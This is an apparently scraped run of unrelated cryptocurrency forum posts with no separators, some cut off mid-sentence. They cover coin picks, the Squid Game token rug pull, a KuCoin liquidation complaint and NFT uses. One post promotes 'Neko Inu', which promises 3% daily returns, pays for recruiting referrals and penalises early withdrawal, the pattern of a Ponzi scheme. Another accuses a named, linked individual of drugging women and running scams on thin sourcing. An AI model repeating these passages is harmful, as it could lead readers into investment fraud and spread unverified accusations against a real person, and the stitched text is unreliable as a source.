My small old ass apartment: boom house on the water with a dock: fixed with money 

Almost every single amount of stress is either from worrying about bills or having to do things the hard way.  They say more money more problems but I dont think any of those problems would be worse than being broke lol 

I know small amounts of investments dont make someone rich ( unless you hit the early ones and they take off like shiba or doge etc) but I treat it like a savings account that just has really good interest and at times doubles in value ; when I have a life need I pull some of that savings out . 

Everyone invests different; Im doing it for a better quality of life , no lambos needed here

Ok so I'll explain how to find it but post the lin

The 8000k to 6 billion dollar whatever shiba guy in the news has moved the money into four wallets


But if you look further they also did this same four wallet split 200days ago.

In the largest or the 200day old split wallet you scan find a large amount of shiba moved here: (and this is where the fuckery starts I need help with)

https://etherscan.io/token/0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE?a=0x95a9bd206ae52c4ba8eecfc93d18eacdd41c88cc

This wallet is sending small. Amounts of shiba now to what looks like hundreds and hundreds of new wallets every few seconds.

What in the AI bot nightmare is this? (not worried about getting in or out or causing fud I just want to know what this is!)

After all this bullish momentum in the market, I'm left wondering how BNB is still number 3 overall? I know a lot of people on this sub don't love the alternatives like ADA and SOL, but to me it just doesnt really add up. Sure it should be top 10, but a 92 billion market cap?

For clarity, I'm not against it, if you're invested in it I wish you only the best and green days for as far as the eye can see.

For those like me, what project do you think deserves to be number 3? IMO it's got to be DOT, I can see the upcoming Parachain Slot Auction's being an absolute gamechanger.

So I have friends who personally know this guy named Jay ([https://www.instagram.com/liverichmedia/](https://www.instagram.com/liverichmedia/)) and felt the need to expose him to bring justice to thousands of people who he's scammed. 

Besides crypto, Jay is a lifestyle photographer, most recently working with billionaire Adam Weitsman. 

Oh, and Jay is also known to *drug women, abuse them, scam clients, and is extremely manipulative* ([https://www.complaintsboard.com/liverichmedia-unethical-behavior-con-artist-c805723](https://www.complaintsboard.com/liverichmedia-unethical-behavior-con-artist-c805723)) 

But back to the story.. This man was behind other scams you may have heard of, like EMax with a guy named Kamil ([https://instagram.com/kamil](https://instagram.com/kamil)), they even got **Floyd Mayweather** to promote this. They made tens of millions, but that wasn't enough.

Jay came up with a brilliant idea, to  create two more scam projects.

Jay's two most recent scams are BankEth and ApenOut where he was hired as the "marketer". He lures middle aged working class to invest in his shit tokens by talking about God and telling them he's giving them an opportunity, and then he dumps on them. He did this with both tokens. Then he prevent all holders from selling, which is **criminal**. Only his "*whitelisted"* buddies are able to sell.

2 days ago ApenOut token was released, as the dump began today, a friend told me that Jay was celebrating, popping bottles and planning their next shit token. 

I know what happened with Squid Game Token was horrible. We have no one to hold that accountable for. But Jay, we can hold this man accountable. And by doing so, we can discourage him from launching his 4th scam token and prevent more people from getting hurt, and more a\*sholes from launching tokens.

Can we just take a moment and appreciate the fact that ETH has rallied a 5000% from last year low to current year high which makes a whopping 50X return on investment.

This is why normally when people run behind memecoins or the next bitcoin they used to jump from one coin to another if they don't perform well but had they just invested into the top crypto currency they could've just made the same X of returns like the meme coins.

People are assuming the fact that it had run this much how much can it run? This is Crypto if a coin with a dog can rally 100X in a year then project with really underlying value can deliver much better than that.
With ETH 2.0 we can except some higher levels from ETH and if BTC goes as per Plan B , its going a rallying month for ETH. 

Wish I could've gotten into the 87$ level :(

For example, lets just say that I theoretically put $4000 into crypto, watched it quadruple and now I theoretically had $16k in crypto.

Now lets imagine that I theoretically put half of that so $8000 into this funny haha dog coin called Shiba Inu or something in August 2020 and just forgot about it cause it's funny to put a lot of money into stupid jokes.

But theoretically lets say that it turned to $8 billion in a bit over a year and now I want to cash out and move it to my bank account. How would I theoretically go on about this safely if I theoretically had this much money in crypto, in theory.

Well, that's what i can afford this month to invest and i'm in a dilema. ETH seems like it ain't going down. But then i know that it's important to have variety in your portfolio.

What would you do right know with your investment? As a beginner with ETH looking so juicy i'm inclined to go full ETH. So, Would you still go like 30-30 with BTC and ETH and the rest on alts? Or full psycho on ETH trying to do everything you can before ETH2.0? What would you do? Hope not buying some fucking Squid coins...

It's a rather simple question but i wonder how the more seasoned think about this. Hope i can get your input. Ladies and gentlemen, thank you for yer taim.

I have been lurking in reddit-land for years, but have never posted anything; figured I'd start here since Blockchain tech has been my main interest for many years.

Anyways, most of the posts i see talk about selling into fiat and getting new cars, houses etc... i personally see a shift on the horizon where crypto currencies ARE the currency and i have, from day one, never planned to sell into fiat. (Not saying there is something wrong with that, because there isn't. Especially if it gets you more crypto. Situations vary.)

Aside from a massive mistake i made in 2011/12, i have been hanging on. I do want to have a seperate porfolio for day trading soon. But this is to slurp up more crypto, not fiat.

Anyone else out there on board with this mindset? Genuinely curious how many people out here are floating the same raft as me.

Youd be surprised how many investors have no idea how market cap works and impacts price. 

Do you prefer low, mid, or high market cap coins?

I just honestly have a genuine question. How do you decide on which low market cap cryptocurrencies you invest in? I was thinking about diversifying my portfolio today and stumbled across a crypto called Bounce or Auction (idk the technical name ig). It had a super low supply and I think the lowest market cap on Coinbase but has never really taken off or anything like that. Meanwhile, there are coins with a market cap of around 250 mil that suddenly go over 1 billion. In my mind, it would make sense to go with the one with the greatest return potential but I guess a majority of people dont think like that?? Idk. So I guess my question is: How do you decide on which low market cap cryptos to invest in.

There's no other way to handle crypto.  The amount of bullshit people put into making some extra cash is embarrassingly full of shit.   

draft sheets, roadmaps, number crunching, AMAs, Chinese, and japanese candlestick charts, short term haul, long term futures, definitive DCA overdraft accounts, and technical language driven by a crowd of people with the same end goal as me. ...     Just hold the fcking thing.      If you like the crypto that much, anything else to reconfirm you beliefs are redundant.     

  It's all believing using science to reconfirm it.    If there was a science to get rich quick, everyone would be doing it.   

I do a basic system investing into crypto. 

All I have to do is think the crypto market will hit new ATHs. 

Then I hold thinking my coin will be one of those. 

From this point on, it can go from $100ea to $0.0001ea by 2025.     Guess what I will be doing?  I will store the PKs on a piece of paper, and place it in my safe.    When I die , my grandkids will find it cleaning my house of useless shit.    

    I will be that story you hear in the local news.  "Grandchildren find $27M worth of antique cryptocurrencies hidden in a safe under their grandfather death bed"..

And I'd course I  forget because I went senile the last 10 years of my life. 

That's how I hold.  If they crash, They go with me to the grave.

How did you guys do in the recent Tournament Predictions?

This was my first time entering this contest and I was very impressed with my results.

I ranked 15 of 12323 and earned over 4000 tournament points. 

I do ask, what can we do with these points? Can I convert them into moons? Do we receive moons in these contests? Was happy to see how well i ranked but disappointed when because i thought I would have a chance to win moons.

Anyways I had a good time trying out the tournament and look forward to more community events like this. I would still love to hear how you all performed!

NFTs are revolutionizing the way society is monetizing goods and services. But does the current NFT space properly reflect its potential to change our day-to-day lives, or is it filled with too many rushed projects that are only in the space to make a quick ETH or two? Maybe you are not a fan of NFTs in general and can never see yourself getting into the space. NFTs are still new, so some of you may feel that you do not know enough about the space to make an informed decision.

&amp;#x200B;

Whatever your feelings are, please feel free to elaborate on your decision in the comments.

Atari Token is ERC-20 token created and used by the former gaming giant, Atari, Inc.

The prospects of this token include future casino gaming, and more interestingly, use in Ataris future hotel projects.

https://finance.yahoo.com/news/atari-extends-hotel-partnership-icicb-070000948.html

Recently, it has been reported that the company is leaning towards focusing more on crypto and its Atari Token.

With the Atari Token, the Atari Group aims to create a token for the entire video game industry. In the financial year 2020/2021, the Atari Group invoiced (i) 0.8 million under the service and trademark license agreement with Atari Chain for sales of Atari Tokens, (ii) 0.5 million for direct sales of Atari Tokens and (iii) 1.1 million corresponding to the allocation of Atari Tokens to certain members of the Group and to third parties.

In its earnings estimates published on August 16, 2021, the Atari Group had estimated that it would be able to recognize revenue of 2.4 million in respect of these transactions, considering that the expected use cases of the Atari Tokens sold or granted at that date would permit it.

Today has proven to me how stupid people actually are. Most of you by now have probably heard about the Squid Game Token rug pull that happened early yesterday morning. The token was released at $0.01 and within a couple days the price climbed to just over $2800. Whenever someone tried to cash out they were not able to sell due to how the mechanics of the token were set up. The project was obviously rugpulled and the price dropped from $2800 to practically $0. Since this has happened I have watched the chart on CMC and the price is up 28% in the last 24 hours and has a trading volume of $1.2 million which means people are still actively buying it. Are people really this stupid and actually do no research into projects they invest in?

I've been trying to find ways to avoid paying a bunch of fees, or at least transfer to a crypto for the smallest possible cost to myself in the least amount of time.

I've been using the lightning network and the polygon network to transfer between CEX's and DEX's. I usually pay less than $1 in fees this way. But it does involve trades and swaps, a price movement risk I'm willing to take. All tax implications aside.

What is the most efficient way you have found to move crypto around if you need to?

I'd like to start by unequivocally saying DCAing, HODLing and Staking is a great way to make a ton of unrealized gains. It's tried and true and battle tested.

But what if you want to realize some of those gains? 

Obviously there are a lot of different ways you could do it and they're all very contextual. You could set a percentage gain to sell a certain percentage of your stack (ie every 10% gain sell 1% of your stack). You could follow the rainbow charts and start to DCA out the same way you DCA'd in when it reaches a certain color. You could wait until you've gotten a 25/50/100% gain and remove your initial investment and just let the profit ride. Or just sell the whole thing once it's worth a certain dollar amount.

Any of these strategies are viable, but what's most important is you go in with a plan and you stick to it.

What's your way of realizing some gains and storing some dry powder for the next bear market?

Good luck out there!

So, i have moved some UNI from my coinbase account to my coinbase wallet, not really knowing what i was doing, yes I'm a noob, thinking i could swap it for another coin (RNDR), well i didn't realise the transaction fee for doing this is in ETH and is more considerably more than the amount i have in UNI. 

So, as i am a muppet, i thought i could just move it back, with a similar transfer fee to the one i payed to move it to my wallet? (Paid for by a part of my UNI) 

But, theres a gas fee in ETH to move it back, which is more than the price of my UNI (Yes you may have gathered i didn't move much UNI, i just wanted to try it out) so if i pay the gas fee to move it back it will cost me the same in ETH as i would be getting back in UNI ..... Right? 

So the question is, to people who are better informed than I, have i misunderstood something here? Is there a way of incurring a lower gas fee that im not aware of? Do i have to wait till ETH 2.0 when the gas fees will go down? 

In short, have i missed something? 

Or is my UNI sort of stuck in my wallet until i want to pay more in ETH than its worth to get it out? 

Or is there another solution Im overlooking? 

Its not an amount of money in UNI that i cant afford to loose, so if it has to sit there till a time where its cheaper to move it out, Im fine with that.

Fairly new to Crypto so Im seeing this as a learning opportunity.

Just looking for some help/guidance/clarification is all.

Plz be nice as we where all new to something once :')

I feel like I am being taken for a ride

I live in Australia and signed up to Coinbase as a number of places have it listed as a great exchange however it wasnt until I had made a few purchases that I noticed you can sell anything????

I looked into this further and found out that in Australia Coinbase cant convert to AUD so there is no way to cash out any of my purchases.

Next I looked at transferring to an exchange where I can however whilst there is no normal fee, there is a network fee that is huge!! 

Went to transfer SHIB and the network fee was half my balance!

LRC was around 20%

This feels like Im being scammed

What the hell do I do?

I am trying to find a way to get this to CoinSpot as they seem to have the standard sell function here in Australia!!

After watching and listening to some of the participants of NFT con, Im actually changing my mind on what I thought about NFTs. I know there are others out there who consider themselves very new to NFTs so the below may help.  

Yes, they may very well have huge applications, even if theyre basically just niche things right now. 

1. Art pieces - this one has been discussed before but with art houses like Christies selling NFTs, legitimacy is growing quick. There was a representative on Bloomberg today discussing some NFT art sales and that they are bringing in interest from old school art collectors as well. 

2. Musicians and the general arts- a NFT code can basically be written so that a portion of sales from an NFT go to the creator in perpetuity. This is a game changer for creative people who dedicate themselves to their craft!

3. Sports Ticketing - Easier to make and not subject to counterfeiting. Fans could also presumably keep the tickets in their wallet as collectibles etc. Like above, it could also be a source of perpetual revenue for the organizers. 

4. Gaming - skins and collectibles in NFT form would grant your ownership where you could freely buy and sell them to other gamers in the market place. 

5. Collectibles- anything that can be a digital asset could presumably become an NFT where collectors can easily trade or buy them. 

Thats it for now, figure this would be good for others like me who are just starting to grasp some of the major benefits in this space.

Recently I posted on this subreddit about how I kept losing money on Coinspot even though my calculations of profits were showing me I should have broke even or made a profit. I didnt get much of response but when I did my research I started to realise just how dodgy Coinspot was.

Today on Coinspot Etherium hit $6400 AUD compared to on Swyftx where it hit $6200. You can see how much higher the price is in Coinspot when buying. Not only that but when you sell the selling price will be significantly lower than the market. The exit and investment fee is also much higher than multiple platforms. This means youll have to see major gains before you see a profit. Honestly read the reviews on App Store if you want to see more. Hint: they are not good reviews. 

I wanted to share because I didnt receive much response on my previous post so I figured not many of you are aware. I think it would really help some of you new traders. I have moved to swyftx and recommend you do too to see the gains you deserve.

    TL;DR
    I have lost over $15,000 over the course of a couple of months using KuCoins platform. I have been wrongfully liquidated too many times. I have provided them with proof of their app issues on video. They refuse to acknowledge or settle with me. I even offered  to settle for a very low amount. They don't care. Here you will see 100% transparency. This is not okay. I have exchanged dozens of emails only to get a bullshit mediocre response back. 
    "we will email you in 30 min". Ok that was over a month ago.

    Here are screen recordings of my trades and the weird shit that has happened.

    These are links to my YouTube Channel Showing me trading and getting screwed over. OVER 5,000 Future Trades --&gt; Totaling ZERO PROFIT.

&gt;Dear Valued KuCoin User,  
   
&gt;  
&gt;Thank you for reaching out to KuCoin customer support.  
   
&gt;  
&gt;To better manage your Future positions, you will need to know the differences among the following prices:  
   
&gt;  
&gt;**Mark price**: The latest mark price of this contract which is used for Unrealised PNL calculation. **If the mark price reaches the liquidation price, the position will be liquidated.**  
**Entry Price**: The average entry price of the current position.  
**Liquidation Price**: If the mark price of the contract reaches below this price (when long) or above this price (when short), your position will be liquidated.  
   
&gt;  
&gt;Please kindly note that **if the mark price reaches the liquidation price**, the position will be taken over by the liquidation engine and get liquidated. You may check the real-time mark price on the trading page as below:  
You may also check the mark price history on [https://futures.kucoin.com/contract/detail](https://futures.kucoin.com/contract/detail%E2%80%8B)

&gt;  
&gt;This is Yilia and I'm glad to be of service to you. As per your question, please kindly note that Traders shall take notice of the price gap of the liquidation price and the mark price. If the mark price reaches the liquidation price, the position will be taken over by the liquidation engine and get liquidated. **As you can check from the mark price history on the following page, the mark price indeed reached your liquidation price so you got liquidated normally.:**  
[**https://futures.kucoin.com/contract/detail**](https://futures.kucoin.com/contract/detail)  
   
&gt;  
&gt;**We can totally understand your concerns since you thought that you have market close the position before the liquidation, however, as you can check below(It was taken from your Video), when you want to close the position, you already got liquidated, since the price changed rapidly at that time(which you can also check from your Video at that time):**  
  
   
&gt;

**Lets take a look at how they describe their futures**

## What is Mark Price

&gt;In traditional markets, a position is usually marked to the last trading price (i.e., mark to market), on which unrealised Pnl and liquidation triggering depend. However, unnecessary liquidation may occur if the market is being manipulated, is illiquid or the Mark Price swings significantly relative to its Index Price. KuCoin Futures utilizes a system called Fair Price Marking to avoid the situations above. **This system sets the Mark Price of the contract to the Fair Price instead of the last trading price.**  
&gt;  
&gt;Fair Price Marking only affects the liquidation price and unrealised Pnl. Realised Pnl is not affected.  
&gt;  
&gt;**When the index price behaves abnormally, the marking method will be changed temporarily which is similar to simple last trading price marking.**  
&gt;  
&gt;Calculation of Mark Price  
&gt;  
&gt;**For Perpetual Contracts, the Fair Price is equal to the underlying Index Price plus a decaying Funding basis rate.**  
&gt;  
&gt;Funding Basis=Funding Rate \\times \\left( \\frac{Time to Funding}{Funding Interval} \\right)*FundingBasis*=*FundingRate*(*FundingIntervalTimetoFunding*)  
&gt;  
&gt;Fair Price=Index Price \\times1+Funding Basis*FairPrice*=*IndexPrice*1+*FundingBasis*

 

# What is Funding?

&gt;The Last Price indicates the last traded price on KuCoin Futures. To avoid the Last Price deviates from the spot price, KuCoin Futures uses the Funding mechanism to ensure that the last price is always anchored to the global spot price.  
&gt;  
&gt;Funding occurs every 8 hours at **04:00 UTC, 12:00 UTC and 20:00 UTC**. Traders will only pay or receive funding if they hold a position at one of these times. If you close your position prior to the funding exchange, then you will not pay or receive funding.  
&gt;  
&gt;**When the Funding Rate is positive, longs pay shorts. When the Funding Rate is negative, shorts pay longs.**  
&gt;  
&gt;Funding Calculations  
&gt;  
&gt;{{Funding=Position\\ Value \\times Funding\\ Rate}}*Funding*=*Position* *Value**Funding* *Rate*  
&gt;  
&gt;Position Value is determined by the mark price at funding timestamp.  
&gt;  
&gt;For example, trader A holds a long position of 10,000 lots XBTUSDM and the mark price is 5,000 USD at the funding timestamp with the current funding rate at 0.02%.  
&gt;  
&gt;According to the descriptions above, we could find out:  
&gt;  
&gt;Position Value = 10,000 / 5,000 = 2 BTC  
&gt;  
&gt;Funding = 2 BTC \* 0.0250% = 0.0005 BTC  
&gt;  
&gt;As the funding rate is positive, longs pays the shorts. Therefore, trader A needs to pay a funding fee of 0.0005 BTC and the trader B who shorts the same sized positions will receive 0.0005 BTC. If trader A closes the position before the funding timestamp,then he does not need to pay the funding fees.  
&gt;  
&gt;Funding Rate Calculation  
&gt;  
&gt;The Funding Rate is composed of **Interest Rate** and **Premium Index**:  
&gt;  
&gt;1. Interest Rate  
&gt;  
&gt;Each contract on KuCoin Futures consists two instruments: Base Currency and Quote Currency. The Interest Rate is a function of the interest rates between the two currencies, indicating the differences between the Quote Currency(USD) and the Base Currency(BTC) in specified funding interval.  
&gt;  
&gt;Interest\\ Rate = \\frac{I\_{USD} - I\_{BTC}}{Funding\\ Interval}*Interest* *Rate*=*Funding* *IntervalIUSD**IBTC*  
&gt;  
&gt;I\_{USD}:8-Hour\\ Average\\ USD\\ Interest\\ Rate*IUSD*:8*Hour* *Average* *USD* *Interest* *Rate*  
&gt;  
&gt;I\_{BTC}:8-Hour\\ Average\\ BTC\\ Interest\\ Rate*IBTC*:8*Hour* *Average* *BTC* *Interest* *Rate*  
&gt;  
&gt;KaTeX can only parse string typed expression  
&gt;  
&gt;Traders could check the Interest Rate at [Contract Specifications](https://futures.kucoin.com/contract/detail) and the corresponding historical data at the index page.  
&gt;  
&gt;2. Premium Index  
&gt;  
&gt;The perpetual contract may trade at a significant premium or discount to the Mark Price. In these situations, the Premium Index will be used to raise or lower the next Funding Rate.  
&gt;  
&gt;{ Premium\\ Index=\\frac{Max(Impact\\ bid\\ price - Mark\\ price, 0) - Max(Mark\\ price - Impact\\ bid\\ price\_{ask}, 0)}{Spot\\ Index}} + Funding Basis*Premium* *Index*=*Spot* *IndexMax*(*Impact* *bid* *price**Mark* *price*,0)*Max*(*Mark* *price**Impact* *bid* *priceask*,0)+*FundingBasis*  
&gt;  
&gt;Premium Index8-hour TWAP of the .XBTUSDPI Index  
&gt;  
&gt;Funding Basis =Funding Rate \* (Time until Funding / Funding Interval)  
&gt;  
&gt;Traders could check the Premium Index at [Contract Specifications](https://futures.kucoin.com/contract/detail) and the corresponding historical data at the index page.  
&gt;  
&gt;3.Funding Rate  
&gt;  
&gt;The initial Funding Rate is calculated based on the 8-Hour Interest Rate and Premium Index.  
&gt;  
&gt;{Initial\\ Funding\\ Rate = Premium\\ Index+clamp(Interest\\ Rate-Premium\\ Index , 0.05\\% , -0.05\\%)}*Initial* *Funding* *Rate*=*Premium* *Index*\+*clamp*(*Interest* *Rate**Premium* *Index*,0.05%,0.05%)  
&gt;  
&gt;The final Funding Rate is calculated based on the initial Funding Rate, previous Funding Rate (T-1), the Initial Margin and the Maintenance Margin and will be applied for use at the funding timestamp.  
&gt;  
&gt;The final Funding Rate calculated above is then applied to the traders position to determine the Funding amount to be paid or received at the funding timestamp. Traders could check their Funding records at [Funding History](https://futures.kucoin.com/contract/history-rate).

 What is a delivery contract?

&gt;A delivery contract is an agreement to buy or sell a particular commodity or asset at a predetermined price at a specified time in the future.

Why is a delivery contract different from a perpetual contract?

&gt;A perpetual contract has no expiry date, and the contract is available for trading permanently, while a delivery contract has an expiry date, and will be settled to a price derived from the underlying asset according to a prespecified rule. Also, the delivery contract has no funding mechanism and the price is ensured to converge to the price of the underlying asset based on the delivery mechanism.

What is a delivery date?

&gt;A delivery date is a prespecified date when the delivery contract is settled. The price to settle at is a 30-minutes TWAP price (.BXBT30M) of the spot index at 08:00 AM (UTC) on the delivery date. The delivery date is the last Friday of the contract month. Traders can identify the contract month according to the contract ticker. For example, the ticker for a Bitcoin contract to settle in December 2019 is XBTZ19.  
&gt;  
&gt;KuCoin Futures will list 1 quarterly contract (Mar, Jun, Sep, Dec) each quarter and will release the next on the Friday two weeks before the delivery date of the current quarter. The last trading day of a quarterly contract is the same as its delivery date. After the settlement, the contract is not available for trading any longer, and all the open positions of that contract will be closed at the settlement price. (ticker for quarterly contract: H, M, U, Z)

How is a delivery contract marked?

&gt;Similar to the perpetual contract, the delivery contract uses Fair Price Marking to decide the unrealised PnL and liquidation as well. The only difference is, the fair price of the delivery contract is derived from the Fair Basis. Fair Basis is calculated by comparing the Impact Mid Price of the contract to its underlying spot index price. Impact Mid Price is the average price of the Impact Bid Price and the Impact Ask Price.

 Realised PNL

&gt;There are two types of Profit and Loss (i.e., Pnl) on KuCoin Futures.  
&gt;  
&gt;Realised Pnl: This is based on the difference between the entry price and exit price of a position. Trading Fees as well as Funding Fees are also included in the realised Pnl.

Unrealised PNL

&gt;Unrealised PnL: The unrealised Pnl is based on the difference between the average entry price and mark price. It is a reference Pnl of a position. Traders may find a positive or negative unrealised Pnl immediately after an order executes. **This happens when the mark price is different from the last price, and does not necessary mean that you lose money**.

Yes it actually does. Because out of the thousands of trades i have made I never earned money on a negative PNL.

**ANYONE CONFUSED YET ON WHAT PRICE IS WHAT?**

If you go long on a position you are automatically put at a disadvantage and set closer to the liquidation price. 

For Example. If i go long on BTC with 50x leverage at $60,000. That's my entrance price.  
The MARK price is always lower than the price you enter at. So your PNL is automatically in the negative. Sometimes bitcoin will have to increase by over $300 just to start breaking even on your PNL. Until then you are at a loss and put closer to liquidation and losing your money. This is how they steal peoples money. It took me a long time to realize what is going on. It's not right. And I have lost over $15,000 because of these shady tactics. I'm now in financial trouble. I know, I know--don't play with money you can't afford to lose. I thought I was going crazy. I'm not. Other people have said they have had the exact same issues. I Really hate to have to bring it to this level. But there is literal video evidence of this shit happening and I'm being told I'm stupid, practically. This isn't okay. I wan't my money back NOW. At least some of it. This is not fucking okay. I am beyond pissed off.  


I have full spreadsheets of all my trades, transactions.

What is really interesting I noticed....You don't ever actually trade with crypto you transfer into your KuCoin Wallet. As soon as your crypto goes into your wallet, It gets transferred out to another wallet you have no control over. Zero Custody of your crypto. They just give you CREDITS in your profile/account. When you are ready to cash out, they transfer it back into your wallet and then send it to the address requested. You lose 100% custody of your crypto up until the point you want to cash out or transfer. That means they are using your crypto to do whatever they want with. Staking, lending, compounding...ON YOUR DIME, You don't get to profit off of them using your crytpto--and the best part is---you would never know it's happening unless you start scanning your addresses and tracing the transaction.   
I need the crypto community to back me on this. Because what is wrong is wrong. And jsut because someone else flash loaned millions of dollars does not make any other loss lesser than. Theft is Theft. Deception is deception. Watching video evidence and still denying means guilt!

WRONGFUL LIQUIDATIONS THAT ARE FORCED ON TO ME WHEN I HAVE ZERO LIABILITIES. PUT IN POSITIONS AUTOMATICALLY AT DISADVANTAGE. LIQUIDATION AFTER MARKET CLOSE AND CLOSED BEFORE LIQUIDATION PRICE REACHED THRESHOLD. IT's ON SCREEN RECORD AND THEY STILL TELL ME IM WRONG WTF??&gt;

BIG BIG news. Commonwealth bank - one of the countries largest banks in Australia has decided to let its account holders trade crypto. I have not read details about the finer details of this new service. I am most keen to know:

&amp;#x200B;

1. Will Commonwealth Bank run their own exchange?
2. Will they run the wallets?
3. Will they allow staking?
4. Will they insure users from loss similar to losses due to system issues or hacks? They are a financial institution after all.

Frankly as an Australian I'm excited about this news and would open account with Commonwealth Bank just so I can get in on the crypto services.

I  would love to hear from others with news about banking adoption or any more information about what would happen here. 

&amp;#x200B;

May Satoshi smile upon you all and your wallets be full!

Alright, so everything seems to indicate that BTC, ETH and alt coins are going to start seeing pumps in prices. From past price behavior, BTC starts pumping first, become parabolic before other coins before crashing. ETH starts pumping as BTC starts going parabolic and eventually goes parabolic itself. However, we dont know if other coins (SOL, ADA, DOT, MATIC, ALGO, etc.) will start pumping and going parabolic at the same time as ETH, or if they will do so following ETH. So, if you wanted to maximize your gains, how would you trade this alt season? 

Im thinking of first concentrating 80% of my capital in BTC and wait till it reaches 2-3x, then immediately swap for ETH and let my capital grow until ETH reaches $10-12k and then, transfer all funds to 2 or 3 alt coins and let them pump. So, if I can get 2x gains in BTC, 2x gains in ETH and then 3-4x in alt coins, I can get 12-16x gains. 

Is this a good strategy, or is it flawed somewhere? What will your tradings strategy be this alt season?

Seemed cool, a polished cat meme coin in the era of dog meme coins. Ive been following it for a bit. Had the perfect formula for standard pump and dump shit coin. Did like 15x and then faced a big dump that would usually signal the end, but its held out strong. 

I made some good money off it and was gonna call it a day but idk, the team and the concept behind the coin kind of draw me in. They just dropped a sick medium article today. Not gonna lie, its making me wanna buy back in. 

Am I just being stupid here? Doesnt feel like a standard shitcoin to me but I dont wanna get burned on it. Anyone else looked into this?

NEKO INU NFT

Neko-inu, High Risk High returns investment.

Hi guys, I was recently introduced to a crypto staking game called Neko Inu. In my opinion, it is a high risk high reward alternative investment that provides a daily interest of 3% which effectively means that the breaker period for this investment is 33 to 34 days. The returns seems ridiculously high but in the crypto world that has seen 1000% returns in the past 9 months, it might not be that crazy after all.I will be doing a deep dive to provide you guys with some background info and let you decide if this is something that is worth exploring.

**Game mechanics:**The game utilises USDT which is a crypto stablecoin that is pegged to the US dollar so 1 USDT is US$1 or around S$1.38.Upon creating an account and funding the account, you will be able to purchase a pet that ranges from 50-1800 USDT. Once you purchase the pet, there are 5 actions that you will be required to do(just got to click on the action buttons), each action that you do will add 1% to the pet's value.At the end of 12 hours, you will then put the pet on sale where another person in the network purchases it. You will get to keep 3% of the profit while the other 2% goes back to the company and into a daily jackpot. The time that it takes to sell your pet and buy another one can take anywhere from 1 to 45 min.This is the part where it gets interesting. Before selling your pet, you will need to have enough balance in your account to buy another pet of the same value. So for example I bought a pet for 1000 USDT, I will need to have another 1000 USDT in my balance in order to be able to sell my pet after 12 hours and claim my 1000 USDT plus the 3% interest which works out to be a total of 1030 USDT.Another rule of the game is that you can only purchase a pet that is on the same tier or higher than your current pet. So for example if my initial pet belongs to the 1000 USDT tier, my second pet has to be on the 1000, 1300, 1500 or 1800 USDT tier.The interest that you earn on a daily basis can be withdrawn to any crypto wallet that you want via the TRC-20 network. If you are not sure what this is about, we will be doing a Zoom session to explain more. Take note the capital (1000 USDT) always has to be re-invested.As a bonus, there is a daily jackpot in which 10 lucky winners will be selected around 7pm Singapore time.

**Sample Investment summary:**Total capital: 2000 USDTInterest earned every 12 hours: 30 USDTDaily interest: 3%

**Referral mechanics:**As a player of the game, you will only be able to have 1 pet at a time. In order to have 2 or more pets, you will need to refer 5 people to join the game. Once you have 5 direct referrals and hold at least 2 pets you will be upgraded to the breeder tier where you will enjoy several benefits:- Open up 2 more pet slots. You will have to commit more capital or you can re-invest your interest but you will be able to increase your daily earnings. Regardless of whether you have 1, 2 or 3 pets, you will only need to maintain the balance for 1 pet. So for example if I have 1x 1000 USDT pet, I will need to have a balance of 1000 USDT in my account but even if I have 3x 1000 USDT pet, I also just need to maintain a balance of 1000 USDT.- For each direct referral, you will receive 10% of the first pet that they buy when they join the game.- Subsequently, you will receive 5% of the profit each time your direct referrals does a buy &amp; sell of their pet. So if your direct referrals earns 30 USDT every 12 hours, you will earn 1.5 USDT. This incentive is capped at 1.5 USDT per day per direct referral.- In addition, you will also earn 3-4% of the profits from your indirect referrals. For more info on this do join us in our Zoom session.

**Common Questions:**Q: Who is behind this?A: It is a global joint venture between a Hong Kong consortium and casino in Cambodia with the support of an international digital platform, Lemon Game.Q: How does the company earn money?A: Besides the 2% that they deduct from the 5 actions, they also charge a 5% withdrawal fee each time a withdrawal is made from their platform to your own crypto wallets. So for a withdrawal of 100 USDT, you will receive 95 USDT.Q: How long does withdrawal takes?A: Within 48 hours.Q: Can I stop playing the game and cash out my capital anytime I want?A: Yes you can but there will be a penalty if you account is not more than 3 months old.0-30 days, 30% of pet money will be returned.31-60 days, 50% of pet money will be returned.61-90 days, 70% of pet money will be returned.91 days onwards, 100% of pet money will be returned.Players must send a request to [admin@neko-inu.global](mailto:admin@neko-inu.global) and it takes 15 working days to process all closing of accounts.Q: How do I know this is not a scam?This could very well be which is why please do your own research and decide if you are able to tolerate the nature of the investment and stomach the loss of your capital in return for the potential returns.

when i go to this page which is purportedly a scanner for the moonriver network i get two different results for clicking on the name of  a coin and the contract itself

&amp;#x200B;

[https://blockscout.moonriver.moonbeam.network/tokens](https://blockscout.moonriver.moonbeam.network/tokens)

&amp;#x200B;

i have only clicked on a couple of them but if you click on USDC it is a legit contract page but if you click on the address it is a wallet. and they both have the same contract. is there a legitimate reason for this? if i copied the one address would it go to that wallet? isn't it just the letters i see? i could manually do it letter by letter right? i'm not going to use this page but i am trying to learn. i use moonscan. and also i created a new reddit account to only mess with crypto because i didn't want it connected to my normal life.

[if you click on the contract you get this page](https://preview.redd.it/zxdsj34aiax71.jpg?width=1815&amp;format=pjpg&amp;auto=webp&amp;s=d2e1832969754ab0d52beb8cb8eb7c5ceabf064c)

Tax question

Scenario: I have an LLC where I deploy hot spots at locations that want to host. I am aware taxes are paid on the HNT at the time its mined. 

For instance, say a miner earns equivalent to $1000.00 USD a month and I pay my tax rate. I am left with approximately $700.00 USD. 

I have a 50/50 reward contract with a host. I pay them $350.00. 

Do they also pay taxes on this income? Am I able to deter any tax due to the contracts I have?

Good thing Im too chicken shit to actually do it because I exclusively *mentally* time everything wrong, if I wake up to 2.5k ether tomorrow Im going to be kicking myself 

Tell me about your successful trades of the same coin. Unsuccessful trade stories are appreciated too, I just keep telling myself *You know better, You know better* Its too much stress for my style of investing so let me live through you. 

*Disclaimer: no need to tell me not to be afraid to take profits, I did that once and trust me  Im not the personality type thats built for it. Ive learned to be afraid.*

When you think about all the history of Bitcoin, from Satoshi's mining through Mount Gox to the creation of Ethereum to the Bitcoin block size wars, the 2017 ICO craze, through multiple bear markets and the COVID black swan event. 

All of that price action over all of those years - up, down, sideways (but always to the right, of course) - is less than what we saw last month alone. 31 days.

It's kind of mind-blowing when you sit back for a moment and think how far things have come versus how fast they're moving today.

Just a little bit of perspective to take when you're meme-poking Bitcoin with a stick to "do something."

#TL;DR
